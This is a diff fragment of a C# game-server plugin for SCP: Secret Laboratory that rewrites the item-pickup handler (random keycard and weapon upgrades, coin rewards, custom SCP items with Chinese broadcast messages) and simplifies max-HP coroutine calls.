+					if (ylb2.Contains(ev.Player.UserId))
+					{
+						switch (ev.Pickup.ItemId)
+						{
+							case ItemType.GrenadeFlash:
 								ev.IsAllowed = false;
 								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.MicroHID);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的大菠萝变成了电磁炮</color>]");
-							}
-							break;
-						case ItemType.GrenadeFlash:
-							if (cardup >= 80)
-							{
+								ev.Player.AddItem(ItemType.Medkit);
+								break;
+							case ItemType.Radio:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.Medkit);
+								break;
+							case ItemType.WeaponManagerTablet:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.Medkit);
+								break;
+							default:
+								break;
+						}
+					}
+					if (bpb2.Contains(ev.Player.Id))
+					{
+						switch (ev.Pickup.ItemId)
+						{
+							case ItemType.GrenadeFlash:
 								ev.IsAllowed = false;
 								ev.Pickup.Delete();
 								ev.Player.AddItem(ItemType.GrenadeFrag);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的闪光弹变成了手榴弹</color>]");
-							}
-							break;
-						case ItemType.Flashlight:
-							if (cardup >= 80)
-							{
+								break;
+							case ItemType.Radio:
 								ev.IsAllowed = false;
 								ev.Pickup.Delete();
-								ev.Player.AddItem(ItemType.GrenadeFlash);
-								ev.Player.Broadcast(5, "[<color=red>当当当当你的手电筒变成了闪光弹</color>]");
-							}
-							break;
+								ev.Player.AddItem(ItemType.GrenadeFrag);
+								break;
+							case ItemType.WeaponManagerTablet:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.GrenadeFrag);
+								break;
+							default:
+								break;
+						}
 					}
-				}
-				if (!scp1577pick && ev.Pickup.ItemId == ItemType.GunCOM15)
-				{
-					Vector3 scp1577pos2 = RoleType.Scp173.GetRandomSpawnPoint();
-					float num2 = scp1577pos2.x + 10f;
-					float num3 = scp1577pos2.y + 10f;
-					float num4 = scp1577pos2.z + 10f;
-					float num5 = scp1577pos2.x - 10f;
-					float num6 = scp1577pos2.y - 10f;
-					float num7 = scp1577pos2.z - 10f;
-					if (ev.Player.Position.x <= num2 && ev.Player.Position.x >= num5 && ev.Player.Position.y <= num3 && ev.Player.Position.y >= num6 && ev.Player.Position.z <= num4 && ev.Player.Position.z >= num7)
+					if (a127d && ev.Pickup.ItemId == ItemType.GunUSP && !scp3108pick)
 					{
-						scp1577pick = true;
-						scp1577id = ev.Player.Id;
-						ev.Player.Broadcast(5, "<color=lime>你捡起了 信号枪</color>\n[<color=red>SCP-1577</color>]\n<color=lime>使用本手枪射击可以呼叫空投</color>");
+						scp3108playerid = ev.Player.Id;
+						scp3108pick = true;
+						Exiled.API.Features.Map.Broadcast(5, "<color=red>SCP-3108已被捡起被打中的人会强行转换身份</color>");
+						ev.Player.Broadcast(5, "<color=lime>你捡起了</color>\n[<color=red>SCP-3108</color>]\n<color=lime>使用本手枪射中人会让他角色变化 你只能开一枪</color>");
 					}
-				}
-				else if (ev.Pickup.ItemId == ItemType.GunCOM15 && !scp2818pick)
-				{
-					Exiled.API.Features.Map.Broadcast(5, "SCP-2818已经被" + ev.Player.Nickname + "捡起");
-					ev.Player.Broadcast(5, "你捡起了2818 开枪后瞬间死亡伤害1000点");
-					scp2818 = ev.Player;
-					scp2818id = ev.Player.Id;
-					scp2818pick = true;
-				}
-				if (ev.Pickup.ItemId == ItemType.KeycardJanitor && !scp005)
-				{
-					scp005aid = ev.Player.Id;
-					ev.Player.Broadcast(5, "<color=lime>你捡起了</color>[<color=red>SCP-005</color>]");
-					scp005 = true;
-				}
-				if (ev.Pickup.ItemId == ItemType.GunUSP)
-				{
-					a127 = false;
-				}
-				if (ev.Pickup.ItemId == ItemType.Coin)
-				{
-					switch (new System.Random().Next(1, 13))
+					if (ev.Player.Id == scp914mid)
 					{
-						case 1:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.Coin);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[硬币]");
-							break;
-						case 2:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.MicroHID);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[电磁炮·有电]");
-							break;
-						case 3:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.GunE11SR);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[九尾步枪]");
-							break;
-						case 4:
-							ev.Player.AddItem(ItemType.KeycardChaosInsurgency);
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[收容工程师卡]");
-							break;
-						case 5:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.GrenadeFrag);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[手雷]");
-							break;
-						case 6:
-							ev.Player.AddItem(ItemType.Ammo556);
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[5.56子弹]");
-							break;
-						case 7:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.GunLogicer);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[大菠萝]");
-							break;
-						case 8:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.KeycardGuard);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[保安卡]");
-							break;
-						case 9:
-							ev.Player.AddItem(ItemType.Radio);
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[对讲机有电]");
-							break;
-						case 10:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.KeycardScientist);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[科学家卡]");
-							break;
-						case 11:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.SCP500);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[科学家卡]");
-							break;
-						case 12:
-							ev.IsAllowed = false;
-							ev.Pickup.Delete();
-							ev.Player.AddItem(ItemType.Flashlight);
-							ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[手电筒]");
-							break;
+						switch (new System.Random().Next(1, 4))
+						{
+							case 2:
+								switch (ev.Pickup.ItemId)
+								{
+									case ItemType.KeycardScientist:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardScientistMajor);
+										break;
+									case ItemType.KeycardJanitor:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardScientist);
+										break;
+									case ItemType.KeycardNTFLieutenant:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardNTFCommander);
+										break;
+									case ItemType.KeycardScientistMajor:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardContainmentEngineer);
+										break;
+									case ItemType.KeycardChaosInsurgency:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardO5);
+										break;
+									case ItemType.KeycardNTFCommander:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardO5);
+										break;
+									case ItemType.KeycardZoneManager:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardContainmentEngineer);
+										break;
+									case ItemType.KeycardContainmentEngineer:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardFacilityManager);
+										break;
+									case ItemType.KeycardFacilityManager:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardO5);
+										break;
+									case ItemType.GunCOM15:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunProject90);
+										break;
+									case ItemType.GunProject90:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunE11SR);
+										break;
+									case ItemType.GunE11SR:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunLogicer);
+										break;
+									case ItemType.GunLogicer:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.MicroHID);
+										break;
+									case ItemType.Flashlight:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GrenadeFlash);
+										break;
+									case ItemType.GrenadeFlash:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GrenadeFrag);
+										break;
+								}
+								break;
+							case 3:
+								switch (ev.Pickup.ItemId)
+								{
+									case ItemType.KeycardScientistMajor:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardScientist);
+										break;
+									case ItemType.KeycardScientist:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardJanitor);
+										break;
+									case ItemType.KeycardNTFCommander:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardNTFLieutenant);
+										break;
+									case ItemType.KeycardChaosInsurgency:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardChaosInsurgency);
+										break;
+									case ItemType.KeycardContainmentEngineer:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.KeycardZoneManager);
+										break;
+									case ItemType.GunProject90:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunCOM15);
+										break;
+									case ItemType.GunE11SR:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunProject90);
+										break;
+									case ItemType.GunLogicer:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunE11SR);
+										break;
+									case ItemType.MicroHID:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GunLogicer);
+										break;
+									case ItemType.GrenadeFlash:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.Flashlight);
+										break;
+									case ItemType.GrenadeFrag:
+										ev.IsAllowed = false;
+										ev.Pickup.Delete();
+										ev.Player.AddItem(ItemType.GrenadeFlash);
+										break;
+								}
+								break;
+						}
+					}
+					if (ev.Player.Id == scp181id)
+					{
+						int cardup = new System.Random().Next(1, 100);
+						switch (ev.Pickup.ItemId)
+						{
+							case ItemType.KeycardScientist:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardScientistMajor);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的科学家变成了大科学家卡</color>]");
+								}
+								break;
+							case ItemType.KeycardJanitor:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardScientist);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的清洁工变成了科学家卡</color>]");
+								}
+								break;
+							case ItemType.KeycardNTFLieutenant:
+								if (cardup >= 80)
+								{
+									ev.Player.AddItem(ItemType.KeycardNTFCommander);
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的士官卡变成了指挥官卡</color>]");
+								}
+								break;
+							case ItemType.KeycardScientistMajor:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardFacilityManager);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的大科学家变成了收容工程师卡</color>]");
+								}
+								break;
+							case ItemType.KeycardFacilityManager:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardNTFCommander);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的收容工程师卡变成了指挥官卡</color>]");
+								}
+								break;
+							case ItemType.KeycardNTFCommander:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardO5);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的指挥官卡变成了黑卡</color>]");
+								}
+								break;
+							case ItemType.KeycardContainmentEngineer:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardFacilityManager);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的区域总监卡变成了设施总监卡</color>]");
+								}
+								break;
+							case ItemType.KeycardSeniorGuard:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardNTFLieutenant);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的九尾狐新兵卡变成了九尾狐士官卡</color>]");
+								}
+								break;
+							case ItemType.KeycardGuard:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardSeniorGuard);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的保安卡变成了设施九尾狐新兵卡</color>]");
+								}
+								break;
+							case ItemType.KeycardChaosInsurgency:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.KeycardO5);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的混沌卡变成了设施黑卡</color>]");
+								}
+								break;
+							case ItemType.GunCOM15:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.GunProject90);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的小手枪变成了P90</color>]");
+								}
+								break;
+							case ItemType.GunProject90:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.GunE11SR);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的P90变成了九尾步枪</color>]");
+								}
+								break;
+							case ItemType.GunE11SR:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.GunLogicer);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的九尾步枪变成了大菠萝</color>]");
+								}
+								break;
+							case ItemType.GunLogicer:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.MicroHID);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的大菠萝变成了电磁炮</color>]");
+								}
+								break;
+							case ItemType.GrenadeFlash:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.GrenadeFrag);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的闪光弹变成了手榴弹</color>]");
+								}
+								break;
+							case ItemType.Flashlight:
+								if (cardup >= 80)
+								{
+									ev.IsAllowed = false;
+									ev.Pickup.Delete();
+									ev.Player.AddItem(ItemType.GrenadeFlash);
+									ev.Player.Broadcast(5, "[<color=red>当当当当你的手电筒变成了闪光弹</color>]");
+								}
+								break;
+						}
+					}
+					if (!scp1577pick && ev.Pickup.ItemId == ItemType.GunCOM15)
+					{
+						Vector3 scp1577pos2 = RoleType.Scp173.GetRandomSpawnPoint();
+						float num2 = scp1577pos2.x + 10f;
+						float num3 = scp1577pos2.y + 10f;
+						float num4 = scp1577pos2.z + 10f;
+						float num5 = scp1577pos2.x - 10f;
+						float num6 = scp1577pos2.y - 10f;
+						float num7 = scp1577pos2.z - 10f;
+						if (ev.Player.Position.x <= num2 && ev.Player.Position.x >= num5 && ev.Player.Position.y <= num3 && ev.Player.Position.y >= num6 && ev.Player.Position.z <= num4 && ev.Player.Position.z >= num7)
+						{
+							scp1577pick = true;
+							scp1577id = ev.Player.Id;
+							ev.Player.Broadcast(5, "<color=lime>你捡起了 信号枪</color>\n[<color=red>SCP-1577</color>]\n<color=lime>使用本手枪射击可以呼叫空投</color>");
+						}
+					}
+					else if (ev.Pickup.ItemId == ItemType.GunCOM15 && !scp2818pick)
+					{
+						Exiled.API.Features.Map.Broadcast(5, "SCP-2818已经被" + ev.Player.Nickname + "捡起");
+						ev.Player.Broadcast(5, "你捡起了2818 开枪后瞬间死亡伤害1000点");
+						scp2818 = ev.Player;
+						scp2818id = ev.Player.Id;
+						scp2818pick = true;
+					}
+					if (ev.Pickup.ItemId == ItemType.KeycardJanitor && !scp005)
+					{
+						scp005aid = ev.Player.Id;
+						ev.Player.Broadcast(5, "<color=lime>你捡起了</color>[<color=red>SCP-005</color>]");
+						scp005 = true;
+					}
+					if (ev.Pickup.ItemId == ItemType.GunUSP)
+					{
+						a127 = false;
+					}
+					if (ev.Pickup.ItemId == ItemType.Coin)
+					{
+						switch (new System.Random().Next(1, 13))
+						{
+							case 1:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.Coin);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[硬币]");
+								break;
+							case 2:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.MicroHID);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[电磁炮·有电]");
+								break;
+							case 3:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.GunE11SR);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[九尾步枪]");
+								break;
+							case 4:
+								ev.Player.AddItem(ItemType.KeycardChaosInsurgency);
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[收容工程师卡]");
+								break;
+							case 5:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.GrenadeFrag);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[手雷]");
+								break;
+							case 6:
+								ev.Player.AddItem(ItemType.Ammo556);
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[5.56子弹]");
+								break;
+							case 7:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.GunLogicer);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[大菠萝]");
+								break;
+							case 8:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.KeycardGuard);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[保安卡]");
+								break;
+							case 9:
+								ev.Player.AddItem(ItemType.Radio);
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[对讲机有电]");
+								break;
+							case 10:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.KeycardScientist);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[科学家卡]");
+								break;
+							case 11:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.SCP500);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[科学家卡]");
+								break;
+							case 12:
+								ev.IsAllowed = false;
+								ev.Pickup.Delete();
+								ev.Player.AddItem(ItemType.Flashlight);
+								ev.Player.Broadcast(5, "<color=#FF1493>你的硬币变成了</color>\n[手电筒]");
+								break;
+						}
+					}
+					if (ev.Player.Id == scp457id)
+					{
+						ev.Pickup.Delete();
+					}
+					if (!a127c && ev.Pickup.ItemId == ItemType.GunUSP)
+					{
+						a127c = true;
+						a127 = true;
+						ev.Player.Broadcast(5, "<color=lime>你捡起了</color>[<color=red>SCP-127</color>]\n<color=lime>当你扔掉或者死亡都SCP-127都会消失</color>");
+						Exiled.API.Features.Map.Broadcast(10, "SCP127力量已经出现");
+					}
+					Vector3 pos2 = ev.Player.Position;
+					if (pos2.y > -735f && pos2.y < -730f && !jkl)
+					{
+						jkl = true;
+						jklid = ev.Player.UserId;
+						ev.Player.Broadcast(5, "你捡起了SCP-金坷垃使用后恢复500点血");
+						Exiled.API.Features.Map.Broadcast(5, "SCP-金坷垃被捡起了");
+					}
+					if (Dio2.Contains(ev.Player.UserId))
+					{
+						ev.Pickup.Delete();
 					}
 				}
-				if (ev.Player.Id == scp457id)
+				catch
 				{
-					ev.Pickup.Delete();
-				}
-				if (!a127c && ev.Pickup.ItemId == ItemType.GunUSP)
-				{
-					a127c = true;
-					a127 = true;
-					ev.Player.Broadcast(5, "<color=lime>你捡起了</color>[<color=red>SCP-127</color>]\n<color=lime>当你扔掉或者死亡都SCP-127都会消失</color>");
-					Exiled.API.Features.Map.Broadcast(10, "SCP127力量已经出现");
-				}
-				Vector3 pos2 = ev.Player.Position;
-				if (pos2.y > -735f && pos2.y < -730f && !jkl)
-				{
-					jkl = true;
-					jklid = ev.Player.UserId;
-					ev.Player.Broadcast(5, "你捡起了SCP-金坷垃使用后恢复500点血");
-					Exiled.API.Features.Map.Broadcast(5, "SCP-金坷垃被捡起了");
-				}
-				if (Dio2.Contains(ev.Player.UserId))
-				{
-					ev.Pickup.Delete();
+					Log.Info("捡起物品出现异常");
 				}
 			}
-			catch
-			{
-				Log.Info("捡起物品出现异常");
-			}
+
 		}
 
 		public void OnPlayerHurt(HurtingEventArgs ev)
@@ -8345,7 +8638,7 @@ namespace YYYLike
 					ev.Amount = 0f;
 					ev.Target.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Scp0492, true);
 					ev.Target.Broadcast(10, "<color=#FFC0CB>---[SCP049_2]---</color>\n<color=#00FFFF>HP:1400</color>");
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Target, 1400)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Target, 1400));
 					xp += 50;
 					if (xp == 100)
 					{
@@ -8493,7 +8786,7 @@ namespace YYYLike
 				Vector3 vector3 = ev.Target.Position;
 				ev.Amount = 0f;
 				ev.Target.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Scp0492, true);
-				Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(scp49j, 1000)));
+				Timing.RunCoroutine(RunRestoreMaxHp(scp49j, 1000));
 				Setrank_new("SCP-49-J", "yellow", ev.Target);
 				ev.Target.Broadcast(10, "<color=#FFC0CB>[SCP-49-J 瘟疫二逼]</color>\n<color=#00FFFF>你无法攻击人 但是你可以拉起小僵尸</color>\n<color=#FFC0CB>当经验超过600后你可以攻击人类</color>");
 				scp49jid = 0;
@@ -8864,26 +9157,26 @@ namespace YYYLike
 				Setrank_new("SCP-682", "red", ev.Player);
 				scp682.Add(ev.Player.UserId);
 				Log.Info(ev.Player.Nickname + "成为SCP682");
-				Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 6000)));
+				Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 6000));
 			}
 			switch (ev.Player.Role)
 			{
 				case RoleType.Scp096:
 					if(Player.List.Count() <= 30)
                     {
-						Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 1500)));
+						Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 1500));
 					}
                     else
                     {
-						Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 2000)));
+						Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 2000));
 
 					}
 					break;
 				case RoleType.Scp173:
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 4200)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 4200));
 					break;
 				case RoleType.ClassD:
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 100)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 100));
 					if(qingjiegongnum<2)
 					{
 						qingjiegongnum++;
@@ -8892,7 +9185,7 @@ namespace YYYLike
 					break;
 				case RoleType.Scp0492:
 					ev.Player.Broadcast(10, "<color=#FFC0CB>---[SCP049_2]---</color>\n<color=#00FFFF>HP:1400</color>");
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 1400)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 1400));
 					xp += 50;
 					if (xp == 100)
 					{
@@ -8918,47 +9211,47 @@ namespace YYYLike
 				case RoleType.Tutorial:
 					break;
 				case RoleType.Scp93989:
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 6000)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 6000));
 					break;
 				case RoleType.Scp93953:
 					Setrank_new("SCP-939-3", "red", ev.Player);
 					ev.Player.Broadcast(10, "<color=#FF0000>你是SCP-939-3你攻击伤害为100点哦qwq</color>");
 					Log.Info(ev.Player.Nickname + "939-3");
 					scp939id = ev.Player.Id;
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 6000)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 6000));
 					break;
 				case RoleType.ChaosInsurgency:
 					ev.Player.Broadcast(10, "<color=#FFC0CB>[混沌分裂者]</color>\n<color=#00FFFF>你的任务是救出D级杀光九尾或与SCP合作</color>\n你对SCP造成的伤害<color=#FFD700>+5</color>");
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 120)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 120));
 					break;
 				case RoleType.NtfCadet:
 					ev.Player.Ammo[(int)AmmoType.Nato556] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato762] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato9] = 400;
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 100)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 100));
 					break;
 				case RoleType.NtfCommander:
 					ev.Player.Ammo[(int)AmmoType.Nato556] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato762] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato9] = 400;
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 150)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 150));
 					ev.Player.Broadcast(10, "<color=#FFC0CB>[九尾狐指挥官]</color>\n<color=#00FFFF>你可以给所有九尾狐阵营发送信息,冷却80秒</color>\n详细<color=#FFD700>按~键激活控制台输入.help查看帮助</color>");
 					break;
 				case RoleType.FacilityGuard:
 					ev.Player.Ammo[(int)AmmoType.Nato556] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato762] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato9] = 400;
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 100)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 100));
 					ev.Player.Broadcast(10, "<color=#FFC0CB>[设施保安]</color>\n<color=#00FFFF>你的任务是捆绑救出D级科学家杀光SCP与混沌</color>\n你可以前往<color=#FFD700>逃脱点</color>获得物资");
 					break;
 				case RoleType.NtfLieutenant:
 					ev.Player.Ammo[(int)AmmoType.Nato556] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato762] = 400;
 					ev.Player.Ammo[(int)AmmoType.Nato9] = 400;
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 120)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 120));
 					break;
 				case RoleType.Scp106:
-					Coroutines.Add(Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 650)));
+					Timing.RunCoroutine(RunRestoreMaxHp(ev.Player, 650));
 					break;
 				default:
 					break;
